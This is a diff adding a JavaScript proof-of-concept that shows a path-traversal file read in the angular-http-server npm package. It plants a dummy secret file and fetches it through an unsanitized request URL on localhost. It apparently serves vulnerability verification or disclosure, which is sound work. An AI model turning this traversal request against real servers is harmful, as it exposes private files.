@@ -1,0 +1,40 @@
+```javascript
+const http = require("http");
+const fs = require("fs");
+const path = require("path");
+const os = require("os");
+
+// Create a "secret" file outside the server's intended web root to prove
+// that arbitrary files can be read via path traversal.
+const secretPath = path.join(os.tmpdir(), "secret-" + Date.now() + ".txt");
+fs.writeFileSync(secretPath, "TOP-SECRET-DATA-12345");
+
+// Requiring the package starts the vulnerable HTTP server on port 8000.
+// Inside it, `possibleFilename` is built directly from req.url with no
+// sanitization and passed straight into fs.stat/fs.readFileSync.
+require("angular-http-server");
+
+setTimeout(() => {
+    // Build a path-traversal URL that walks from cwd up to the secret file.
+    const relTraversal = path.relative(process.cwd(), secretPath).split(path.sep).join("/");
+    const traversalUrl = "/" + relTraversal;
+
+    http.get({ host: "localhost", port: 8000, path: encodeURI(traversalUrl) }, (res) => {
+        let data = "";
+        res.on("data", (chunk) => (data += chunk));
+        res.on("end", () => {
+            console.log("Response body:\n" + data);
+            if (data.includes("TOP-SECRET-DATA-12345")) {
+                console.log("VULNERABLE: arbitrary file read via unsanitized possibleFilename (path traversal)");
+            } else {
+                console.log("Exploit did not confirm traversal");
+            }
+            fs.unlinkSync(secretPath);
+            process.exit(0);
+        });
+    }).on("error", (err) => {
+        console.error("Request error:", err);
+        process.exit(1);
+    });
+}, 500);
+```
